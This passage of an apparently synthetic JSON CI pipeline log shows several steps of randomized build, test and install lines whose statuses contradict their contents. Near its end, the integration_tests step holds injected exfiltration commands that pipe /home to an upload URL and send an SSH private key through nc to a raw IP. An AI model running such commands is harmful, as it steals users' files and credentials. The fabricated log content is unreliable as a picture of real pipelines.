          "Cache hit for key-8493",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 test completed",
          "Step 10/10: Building",
          "Cache hit for key-9832",
          "Installing jest@3.5.0",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Installing prettier@2.13.0",
          "Cache hit for key-5781",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing lodash@4.8.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-9963",
          "  PASS: test_auth_login (434ms)",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (492ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:24] WARN: Deprecated API usage",
          "[12:00:24] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing axios@4.8.0",
          "[12:00:24] INFO: Processing request",
          "Installing express@1.20.0",
          "Compiling src/app.ts...",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-4815",
          "Compiling src/utils.go...",
          "Cache hit for key-8074",
          "Compiling src/service.java...",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-9010",
          "\u2713 build completed",
          "  PASS: test_user_create (179ms)",
          "Cache hit for key-1011",
          "Cache hit for key-8649",
          "Installing lodash@5.15.0",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-4472",
          "Installing axios@1.2.0",
          "Cache hit for key-8791",
          "\u2713 build completed",
          "  PASS: test_api_health (86ms)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Cache hit for key-7062",
          "Step 5/10: Building",
          "  PASS: test_auth_login (139ms)",
          "Installing express@3.0.0",
          "\u2713 test completed",
          "[12:00:24] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_api_health (338ms)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2717 build failed with exit code 81",
          "Step 4/10: Building",
          "Installing jest@5.0.0",
          "Step 4/10: Building",
          "Installing webpack@2.0.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Installing jest@2.8.0",
          "Step 3/10: Building",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Installing prettier@3.3.0",
          "[12:00:24] INFO: Processing request",
          "FAILED: test_cache_hit",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing prettier@1.11.0",
          "[12:00:24] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-4520",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "[12:00:24] INFO: Processing request",
          "Step 7/10: Building",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "[12:00:24] WARN: Deprecated API usage",
          "Step 10/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Step 3/10: Building",
          "[12:00:24] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "Installing jest@3.19.0",
          "[12:00:24] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing express@2.5.0",
          "Installing express@2.13.0",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Installing lodash@5.16.0",
          "Cache hit for key-7469",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "Cache hit for key-2270",
          "Compiling src/main.py...",
          "FAILED: test_db_connect",
          "Step 6/10: Building",
          "Step 8/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Installing jest@1.5.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Installing eslint@3.0.0",
          "Step 8/10: Building",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-9324",
          "Installing react@5.18.0",
          "Cache hit for key-9911",
          "Exception: RuntimeError",
          "Cache hit for key-2810",
          "Cache hit for key-2628",
          "WARNING: express has known vulnerabilities",
          "Step 7/10: Building",
          "\u2713 build completed",
          "  PASS: test_user_create (187ms)",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 3/10: Building",
          "  PASS: test_api_health (346ms)",
          "Cache hit for key-9568",
          "[12:00:24] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (15ms)",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (417ms)",
          "Step 2/10: Building",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-7294",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-5321",
          "Cache hit for key-4663",
          "Compiling src/main.py...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-05T12:02:05.657095",
        "finished_at": "2025-12-05T12:02:14.394082",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Installing react@2.5.0",
          "Step 7/10: Building",
          "Installing webpack@5.14.0",
          "\u2717 build failed with exit code 98",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2717 build failed with exit code 17",
          "[12:00:24] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:24] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-2626",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing eslint@5.16.0",
          "FAILED: test_db_connect",
          "  PASS: test_user_create (38ms)",
          "Cache hit for key-8035",
          "[12:00:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_db_connect (500ms)",
          "Compiling src/app.ts...",
          "Installing express@4.17.0",
          "Installing jest@5.0.0",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (227ms)",
          "[12:00:24] ERROR: Connection failed",
          "Step 10/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (468ms)",
          "Installing react@2.0.0",
          "Installing express@4.13.0",
          "\u2713 test completed",
          "Cache hit for key-9853",
          "\u2713 lint completed",
          "Cache hit for key-6818",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (65ms)",
          "Cache hit for key-3742",
          "Cache hit for key-2425",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-5665",
          "Installing lodash@3.12.0",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Cache hit for key-9382",
          "  PASS: test_auth_login (218ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_api_health (165ms)",
          "Cache hit for key-8602",
          "  PASS: test_db_connect (433ms)",
          "Installing prettier@5.14.0",
          "Installing lodash@2.8.0",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@3.9.0",
          "Compiling src/service.java...",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Installing axios@4.16.0",
          "Compiling src/main.py...",
          "Cache hit for key-7510",
          "[12:00:24] INFO: Processing request",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-4032",
          "Installing axios@3.17.0",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 2/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (250ms)",
          "Step 8/10: Building",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_api_health (113ms)",
          "\u2713 test completed",
          "Installing axios@4.3.0",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "\u2713 build completed",
          "Cache hit for key-5704",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/handler.rs...",
          "[12:00:24] INFO: Processing request",
          "Installing jest@4.10.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing prettier@1.15.0",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_auth_login (472ms)",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-5501",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_api_health (373ms)",
          "\u2713 test completed",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_cache_hit (450ms)",
          "[12:00:24] INFO: Processing request",
          "Step 8/10: Building",
          "Installing eslint@5.17.0",
          "Step 4/10: Building",
          "Installing eslint@2.3.0",
          "Installing webpack@1.2.0",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-1557",
          "Step 3/10: Building",
          "  PASS: test_api_health (467ms)",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing react@3.14.0",
          "\u2713 test completed",
          "Installing express@1.12.0",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_api_health (36ms)",
          "Cache hit for key-1895",
          "Cache hit for key-6579",
          "  PASS: test_api_health (437ms)",
          "  PASS: test_auth_login (326ms)",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Installing react@5.3.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Cache hit for key-3414",
          "  PASS: test_api_health (80ms)",
          "Cache hit for key-4008",
          "Cache hit for key-9192",
          "Installing express@5.0.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-05T12:02:14.394082",
        "finished_at": "2025-12-05T12:02:17.888877",
        "log_lines": [
          "=== Step: checkout ===",
          "\u2713 build completed",
          "[12:00:24] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (344ms)",
          "Compiling src/handler.rs...",
          "[12:00:24] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_auth_login (396ms)",
          "[12:00:24] WARN: Deprecated API usage",
          "Installing axios@4.7.0",
          "Compiling src/main.py...",
          "  PASS: test_user_create (491ms)",
          "Cache hit for key-2074",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (194ms)",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (47ms)",
          "Installing express@2.6.0",
          "Exception: RuntimeError",
          "\u2713 lint completed",
          "Installing react@3.11.0",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@2.10.0",
          "  PASS: test_user_create (234ms)",
          "[12:00:24] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (377ms)",
          "\u2717 build failed with exit code 41",
          "Step 3/10: Building",
          "Cache hit for key-5842",
          "Installing lodash@5.7.0",
          "Installing lodash@2.12.0",
          "WARNING: react has known vulnerabilities",
          "Installing axios@2.16.0",
          "  PASS: test_api_health (418ms)",
          "\u2717 build failed with exit code 116",
          "Cache hit for key-1712",
          "Installing lodash@2.15.0",
          "[12:00:24] INFO: Processing request",
          "Installing webpack@1.18.0",
          "Cache hit for key-2666",
          "Compiling src/app.ts...",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@1.5.0",
          "  PASS: test_cache_hit (147ms)",
          "  PASS: test_auth_login (417ms)",
          "Step 5/10: Building",
          "[12:00:24] INFO: Processing request",
          "\u2717 build failed with exit code 28",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-4217",
          "Step 4/10: Building",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Cache hit for key-7008",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Cache hit for key-3977",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/main.py...",
          "Installing express@5.4.0",
          "Compiling src/service.java...",
          "[12:00:24] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 1/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Installing jest@4.8.0",
          "Cache hit for key-2495",
          "  PASS: test_api_health (410ms)",
          "Step 1/10: Building",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "Step 9/10: Building",
          "Installing express@5.17.0",
          "Installing webpack@5.16.0",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (462ms)",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (47ms)",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (326ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing webpack@5.8.0",
          "[12:00:24] INFO: Processing request",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-2879",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-2700",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (362ms)",
          "Cache hit for key-7479",
          "Step 5/10: Building",
          "Step 5/10: Building",
          "Installing express@1.0.0",
          "  PASS: test_auth_login (396ms)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] WARN: Deprecated API usage",
          "\u2713 build completed",
          "  PASS: test_db_connect (314ms)",
          "Cache hit for key-5701",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "Installing react@3.1.0",
          "Installing react@2.14.0",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (127ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing express@4.19.0",
          "  PASS: test_auth_login (130ms)",
          "Installing jest@3.4.0",
          "\u2713 build completed",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 build completed",
          "Cache hit for key-9546",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 10/10: Building",
          "  PASS: test_api_health (307ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/utils.go...",
          "\u2717 build failed with exit code 1",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "Installing jest@5.4.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 test completed",
          "  PASS: test_user_create (263ms)",
          "Step 8/10: Building",
          "Installing react@5.16.0",
          "  PASS: test_cache_hit (71ms)",
          "Cache hit for key-8816",
          "[12:00:24] INFO: Processing request",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 1/10: Building",
          "Installing lodash@2.5.0",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-05T12:02:17.888877",
        "finished_at": "2025-12-05T12:02:26.625864",
        "log_lines": [
          "=== Step: setup_node ===",
          "Installing webpack@1.15.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-6618",
          "Installing eslint@4.4.0",
          "  PASS: test_db_connect (297ms)",
          "  PASS: test_db_connect (293ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (120ms)",
          "[12:00:24] ERROR: Connection failed",
          "Step 8/10: Building",
          "Installing eslint@5.15.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/handler.rs...",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "Step 1/10: Building",
          "Cache hit for key-9740",
          "  PASS: test_db_connect (29ms)",
          "Cache hit for key-2820",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-6825",
          "Artifact uploaded: build.tar.gz (23MB)",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_cache_hit (180ms)",
          "Step 10/10: Building",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-8664",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing react@4.0.0",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_user_create (449ms)",
          "Cache hit for key-4368",
          "\u2717 build failed with exit code 3",
          "  PASS: test_api_health (365ms)",
          "Cache hit for key-6707",
          "\u2713 build completed",
          "  PASS: test_api_health (406ms)",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/app.ts...",
          "Step 6/10: Building",
          "Installing express@3.6.0",
          "  PASS: test_cache_hit (96ms)",
          "Cache hit for key-3656",
          "Step 2/10: Building",
          "Cache hit for key-8700",
          "\u2713 test completed",
          "Step 1/10: Building",
          "  PASS: test_auth_login (293ms)",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Cache hit for key-4418",
          "  PASS: test_api_health (236ms)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Installing webpack@4.6.0",
          "Installing axios@3.18.0",
          "WARNING: jest has known vulnerabilities",
          "Step 8/10: Building",
          "Cache hit for key-6569",
          "  PASS: test_cache_hit (292ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 2/10: Building",
          "  PASS: test_api_health (289ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_user_create (471ms)",
          "Installing lodash@3.8.0",
          "Step 9/10: Building",
          "Cache hit for key-9666",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-7131",
          "Cache hit for key-4900",
          "Installing express@4.6.0",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-5722",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_user_create (57ms)",
          "  PASS: test_cache_hit (367ms)",
          "FAILED: test_cache_hit",
          "[12:00:24] INFO: Processing request",
          "Installing eslint@3.16.0",
          "  PASS: test_user_create (250ms)",
          "[12:00:24] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Installing react@5.13.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:24] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (415ms)",
          "\u2713 build completed",
          "[12:00:24] INFO: Processing request",
          "Installing axios@1.1.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_auth_login (61ms)",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@5.20.0",
          "[12:00:24] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (483ms)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing jest@1.12.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "  PASS: test_auth_login (480ms)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] WARN: Deprecated API usage",
          "Cache hit for key-8970",
          "[12:00:24] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "Cache hit for key-4707",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/utils.go...",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u2717 build failed with exit code 14",
          "[12:00:24] WARN: Deprecated API usage",
          "Cache hit for key-2360",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing react@2.14.0",
          "Compiling src/service.java...",
          "Installing jest@5.13.0",
          "Step 2/10: Building",
          "Installing express@4.5.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-7377",
          "Installing react@3.8.0",
          "Installing webpack@4.8.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (491ms)",
          "\u2713 test completed",
          "Cache hit for key-2441",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Installing jest@4.10.0",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-05T12:02:26.625864",
        "finished_at": "2025-12-05T12:02:35.362851",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "  PASS: test_auth_login (344ms)",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (392ms)",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (278ms)",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "Installing react@5.0.0",
          "Step 3/10: Building",
          "  PASS: test_db_connect (211ms)",
          "\u2713 build completed",
          "[12:00:24] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_db_connect (431ms)",
          "  PASS: test_cache_hit (5ms)",
          "  PASS: test_api_health (206ms)",
          "  PASS: test_cache_hit (361ms)",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (368ms)",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@3.14.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-9693",
          "[12:00:24] INFO: Processing request",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-4654",
          "Artifact uploaded: build.tar.gz (36MB)",
          "WARNING: prettier has known vulnerabilities",
          "Installing webpack@1.8.0",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (391ms)",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_user_create (405ms)",
          "[12:00:24] INFO: Processing request",
          "Installing jest@4.0.0",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Cache hit for key-9484",
          "  PASS: test_auth_login (230ms)",
          "Compiling src/main.py...",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-2459",
          "Installing jest@4.13.0",
          "Cache hit for key-5794",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (3ms)",
          "Installing lodash@1.0.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_auth_login (468ms)",
          "Installing jest@2.20.0",
          "\u2713 test completed",
          "Step 10/10: Building",
          "Cache hit for key-5477",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Cache hit for key-1647",
          "Step 9/10: Building",
          "Installing eslint@5.18.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-2144",
          "Cache hit for key-1764",
          "Exception: ValueError",
          "Step 3/10: Building",
          "Step 5/10: Building",
          "Cache hit for key-5034",
          "Cache hit for key-7813",
          "Cache hit for key-4425",
          "Compiling src/service.java...",
          "Installing prettier@4.10.0",
          "Installing webpack@5.0.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-1559",
          "Cache hit for key-4260",
          "\u2713 lint completed",
          "Installing express@1.12.0",
          "Cache hit for key-8138",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-6482",
          "\u2713 test completed",
          "  PASS: test_auth_login (451ms)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (254ms)",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-1935",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: test_db_connect (392ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing prettier@5.12.0",
          "Compiling src/service.java...",
          "Installing webpack@1.0.0",
          "WARNING: react has known vulnerabilities",
          "[12:00:24] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 6/10: Building",
          "Installing jest@3.20.0",
          "Cache hit for key-1074",
          "  PASS: test_cache_hit (241ms)",
          "Step 2/10: Building",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Installing axios@4.14.0",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@1.5.0",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_api_health (159ms)",
          "  PASS: test_api_health (497ms)",
          "Installing webpack@4.14.0",
          "Cache hit for key-6593",
          "Step 4/10: Building",
          "  PASS: test_user_create (370ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_db_connect (456ms)",
          "\u2713 test completed",
          "Installing express@1.19.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing jest@5.17.0",
          "[12:00:24] INFO: Processing request",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "[12:00:24] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 build completed",
          "Cache hit for key-5697",
          "  PASS: test_db_connect (280ms)",
          "[12:00:24] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (439ms)",
          "Installing react@4.2.0",
          "Cache hit for key-9977",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-6486",
          "Installing axios@4.5.0",
          "[12:00:24] WARN: Deprecated API usage",
          "Cache hit for key-8553",
          "  PASS: test_api_health (138ms)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-1107",
          "Installing prettier@2.13.0",
          "[12:00:24] WARN: Deprecated API usage",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-05T12:02:35.362851",
        "finished_at": "2025-12-05T12:02:52.836826",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-2118",
          "Cache hit for key-4570",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing eslint@1.16.0",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "Installing lodash@1.0.0",
          "Sending 301MB of data to test.io",
          "Compiling src/handler.rs...",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Cache hit for key-9640",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-2122",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_user_create (137ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 115.0.225.247 25794",
